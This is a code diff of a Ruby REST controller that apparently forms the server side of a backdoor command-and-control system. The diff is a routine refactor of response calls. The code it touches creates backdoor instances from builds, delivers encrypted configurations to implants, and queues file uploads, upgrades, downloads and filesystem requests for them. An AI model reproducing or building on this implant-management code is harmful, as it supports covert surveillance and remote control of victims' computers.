@@ -31,7 +31,7 @@ class BackdoorController < RESTController
         end
     end
     
-    return RESTController.ok(classes)
+    return RESTController.reply.ok(classes)
   end
   
   # retrieve the status of a backdoor instance.
@@ -67,14 +67,14 @@ class BackdoorController < RESTController
       end
 
       status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
-      return RESTController.ok(status)
+      return RESTController.reply.ok(status)
     end
 
     # search for the factory of that instance
     factory = Item.where({_kind: 'factory', build: @params['build'], status: 'open'}).first
 
     # the status of the factory must be open otherwise no instance can be cloned from it
-    return RESTController.not_found if factory.nil?
+    return RESTController.reply.not_found if factory.nil?
 
     # increment the instance counter for the factory
     factory[:counter] += 1
@@ -107,7 +107,7 @@ class BackdoorController < RESTController
     backdoor.save
 
     status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
-    return RESTController.ok(status)
+    return RESTController.reply.ok(status)
   end
 
 
@@ -117,14 +117,14 @@ class BackdoorController < RESTController
     case @request[:method]
       when 'GET'
         config = backdoor.configs.where(:sent.exists => false).last
-        return RESTController.not_found if config.nil?
+        return RESTController.reply.not_found if config.nil?
         
         # encrypt the config for the backdoor using the confkey
         json_config = JSON.parse(config[:config])
         bson_config = BSON.serialize(json_config)
         enc_config = aes_encrypt(bson_config.to_s, Digest::MD5.digest(backdoor[:confkey]))
         
-        return RESTController.ok(enc_config, {content_type: 'binary/octet-stream'})
+        return RESTController.reply.ok(enc_config, {content_type: 'binary/octet-stream'})
         
       when 'DELETE'
         config = backdoor.configs.where(:sent.exists => false).last
@@ -133,7 +133,7 @@ class BackdoorController < RESTController
         trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
     end
     
-    return RESTController.ok
+    return RESTController.reply.ok
   end
 
 
@@ -144,7 +144,7 @@ class BackdoorController < RESTController
     backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
     list = backdoor.upload_requests
 
-    return RESTController.ok(list)
+    return RESTController.reply.ok(list)
   end
 
   # retrieve or delete a single upload entity
@@ -159,14 +159,14 @@ class BackdoorController < RESTController
         upl = backdoor.upload_requests.where({ _id: @params['upload']}).first
         content = GridFS.instance.get upl[:_grid].first
         trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
-        return RESTController.ok(content.read, {content_type: content.content_type})
+        return RESTController.reply.ok(content.read, {content_type: content.content_type})
       when 'DELETE'
         backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
         backdoor.upload_requests.destroy_all(conditions: { _id: @params['upload']})
         trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
     end
     
-    return RESTController.ok
+    return RESTController.reply.ok
   end
   
   # retrieve the list of upgrade for a given backdoor
@@ -176,7 +176,7 @@ class BackdoorController < RESTController
     backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
     list = backdoor.upgrade_requests
 
-    return RESTController.ok(list)
+    return RESTController.reply.ok(list)
   end
   
   # retrieve or delete a single upgrade entity
@@ -189,14 +189,14 @@ class BackdoorController < RESTController
         upl = backdoor.upgrade_requests.where({ _id: @params['upgrade']}).first
         content = GridFS.instance.get upl[:_grid].first
         trace :info, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
-        return RESTController.ok(content.read, {content_type: content.content_type})
+        return RESTController.reply.ok(content.read, {content_type: content.content_type})
       when 'DELETE'
         backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
         backdoor.upgrade_requests.destroy_all(conditions: { _id: @params['upgrade']})
         trace :info, "[#{@request[:peer]}] Deleted the UPGRADE #{@params['upgrade']}"
     end
     
-    return RESTController.ok
+    return RESTController.reply.ok
   end
 
   # retrieve the list of download for a given backdoor
@@ -206,7 +206,7 @@ class BackdoorController < RESTController
     backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
     list = backdoor.download_requests
 
-    return RESTController.ok(list)
+    return RESTController.reply.ok(list)
   end
 
   def download
@@ -221,7 +221,7 @@ class BackdoorController < RESTController
         trace :info, "[#{@req_peer}] Deleted the DOWNLOAD #{request}"
     end
 
-    return RESTController.ok
+    return RESTController.reply.ok
   end
 
   # retrieve the list of filesystem for a given backdoor
@@ -231,7 +231,7 @@ class BackdoorController < RESTController
     backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
     list = backdoor.filesystem_requests
 
-    return RESTController.ok(list)
+    return RESTController.reply.ok(list)
   end
   
   def filesystem
@@ -246,7 +246,7 @@ class BackdoorController < RESTController
         trace :info, "[#{@req_peer}] Deleted the FILESYSTEM #{request}"
     end
     
-    return RESTController.ok
+    return RESTController.reply.ok
   end
 
 end
